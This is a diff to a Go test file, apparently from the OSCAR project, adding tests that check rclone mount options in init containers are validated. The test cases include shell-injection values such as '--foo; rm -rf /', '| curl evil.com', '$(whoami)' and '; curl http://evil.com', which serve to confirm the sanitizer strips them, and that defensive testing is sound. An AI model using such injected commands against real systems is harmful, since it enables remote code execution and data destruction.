@@ -16,6 +16,7 @@ limitations under the License.
 package resources
 
 import (
+	"strings"
 	"testing"
 
 	"github.com/grycap/oscar/v4/pkg/types"
@@ -74,6 +75,21 @@ func TestSetMount(t *testing.T) {
 
 	if container.Image != rcloneContainerImage {
 		t.Errorf("expected container image %s, got %s", rcloneContainerImage, container.Image)
+	}
+
+	if len(podSpec.InitContainers) != 1 {
+		t.Fatalf("expected 1 init container, got %d", len(podSpec.InitContainers))
+	}
+
+	initContainer := podSpec.InitContainers[0]
+	if len(initContainer.Args) != 2 {
+		t.Fatalf("expected 2 args, got %d", len(initContainer.Args))
+	}
+	if initContainer.Args[0] != "-c" {
+		t.Errorf("expected arg[0] to be '-c', got %s", initContainer.Args[0])
+	}
+	if !strings.Contains(initContainer.Args[1], "--allow-other") {
+		t.Errorf("expected default communCommand flags in args, got %s", initContainer.Args[1])
 	}
 
 	expectedEnvVars := map[string]string{
@@ -218,5 +234,196 @@ func TestSetWebDavEnvVars(t *testing.T) {
 		} else {
 			t.Errorf("unexpected env var %s", envVar.Name)
 		}
+	}
+}
+
+func TestValidateMountOpts(t *testing.T) {
+	tests := []struct {
+		name  string
+		input string
+		want  string
+	}{
+		{
+			name:  "empty options",
+			input: "",
+			want:  "",
+		},
+		{
+			name:  "valid flags",
+			input: "--buffer-size 128M --vfs-read-chunk-size 64M",
+			want:  "--buffer-size 128M --vfs-read-chunk-size 64M",
+		},
+		{
+			name:  "valid dash flags",
+			input: "--read-only --no-checksum",
+			want:  "--read-only --no-checksum",
+		},
+		{
+			name:  "valid with dots and colons",
+			input: "--config /etc/rclone/rclone.conf --timeout 30s",
+			want:  "--config /etc/rclone/rclone.conf --timeout 30s",
+		},
+		{
+			name:  "rejects shell semicolon",
+			input: "--foo; rm -rf /",
+			want:  "",
+		},
+		{
+			name:  "rejects shell pipe",
+			input: "--foo | curl evil.com",
+			want:  "",
+		},
+		{
+			name:  "rejects command substitution",
+			input: "--foo $(whoami)",
+			want:  "",
+		},
+		{
+			name:  "rejects backtick",
+			input: "--foo `id`",
+			want:  "",
+		},
+		{
+			name:  "rejects ampersand",
+			input: "--foo & whoami",
+			want:  "",
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := ValidateMountOpts(tt.input)
+			if got != tt.want {
+				t.Errorf("validateMountOpts(%q) = %q, want %q", tt.input, got, tt.want)
+			}
+		})
+	}
+}
+
+func TestSetMountWithOptions(t *testing.T) {
+	podSpec := &v1.PodSpec{
+		Containers: []v1.Container{
+			{
+				Name:  rcloneContainerName,
+				Image: rcloneContainerImage,
+				Env:   []v1.EnvVar{},
+				VolumeMounts: []v1.VolumeMount{
+					{
+						Name:      rcloneVolumeName,
+						MountPath: rcloneFolderMount,
+					},
+				},
+			},
+		},
+		Volumes: []v1.Volume{},
+	}
+	service := types.Service{
+		Mount: types.StorageIOConfig{
+			Provider: "minio.provider",
+			Path:     "test-bucket",
+			Options:  "--buffer-size 128M --vfs-read-chunk-size 64M",
+		},
+		StorageProviders: &types.StorageProviders{
+			MinIO: map[string]*types.MinIOProvider{
+				"provider": {
+					AccessKey: "test-access-key",
+					SecretKey: "test-secret-key",
+					Endpoint:  "test-endpoint",
+				},
+			},
+		},
+	}
+	cfg := &types.Config{
+		Name: "oscar",
+		MinIOProvider: &types.MinIOProvider{
+			AccessKey: "test-access-key",
+			SecretKey: "test-secret-key",
+		}}
+
+	SetMount(podSpec, service, cfg)
+
+	if len(podSpec.InitContainers) != 1 {
+		t.Fatalf("expected 1 init container, got %d", len(podSpec.InitContainers))
+	}
+
+	initContainer := podSpec.InitContainers[0]
+	if len(initContainer.Args) != 2 {
+		t.Fatalf("expected 2 args, got %d", len(initContainer.Args))
+	}
+	if initContainer.Args[0] != "-c" {
+		t.Errorf("expected arg[0] to be '-c', got %s", initContainer.Args[0])
+	}
+
+	args := initContainer.Args[1]
+	if !strings.Contains(args, "--buffer-size 128M") {
+		t.Errorf("expected mount option '--buffer-size 128M' in args, got: %s", args)
+	}
+	if !strings.Contains(args, "--vfs-read-chunk-size 64M") {
+		t.Errorf("expected mount option '--vfs-read-chunk-size 64M' in args, got: %s", args)
+	}
+	if !strings.Contains(args, "--allow-other") {
+		t.Errorf("expected default communCommand flags in args, got: %s", args)
+	}
+}
+
+func TestSetMountRejectsMaliciousOptions(t *testing.T) {
+	podSpec := &v1.PodSpec{
+		Containers: []v1.Container{
+			{
+				Name:  rcloneContainerName,
+				Image: rcloneContainerImage,
+				Env:   []v1.EnvVar{},
+				VolumeMounts: []v1.VolumeMount{
+					{
+						Name:      rcloneVolumeName,
+						MountPath: rcloneFolderMount,
+					},
+				},
+			},
+		},
+		Volumes: []v1.Volume{},
+	}
+	service := types.Service{
+		Mount: types.StorageIOConfig{
+			Provider: "minio.provider",
+			Path:     "test-bucket",
+			Options:  "; curl http://evil.com",
+		},
+		StorageProviders: &types.StorageProviders{
+			MinIO: map[string]*types.MinIOProvider{
+				"provider": {
+					AccessKey: "test-access-key",
+					SecretKey: "test-secret-key",
+					Endpoint:  "test-endpoint",
+				},
+			},
+		},
+	}
+	cfg := &types.Config{
+		Name: "oscar",
+		MinIOProvider: &types.MinIOProvider{
+			AccessKey: "test-access-key",
+			SecretKey: "test-secret-key",
+		}}
+
+	SetMount(podSpec, service, cfg)
+
+	if len(podSpec.InitContainers) != 1 {
+		t.Fatalf("expected 1 init container, got %d", len(podSpec.InitContainers))
+	}
+
+	initContainer := podSpec.InitContainers[0]
+	args := initContainer.Args[1]
+
+	// Ensure the malicious content was stripped out
+	if strings.Contains(args, "curl") {
+		t.Errorf("malicious option was not sanitized, args contains 'curl': %s", args)
+	}
+	if strings.Contains(args, ";") {
+		t.Errorf("malicious option was not sanitized, args contains ';': %s", args)
+	}
+
+	// But the normal rclone content should still be there
+	if !strings.Contains(args, "--allow-other") {
+		t.Errorf("expected default communCommand flags in args, got: %s", args)
 	}
 }
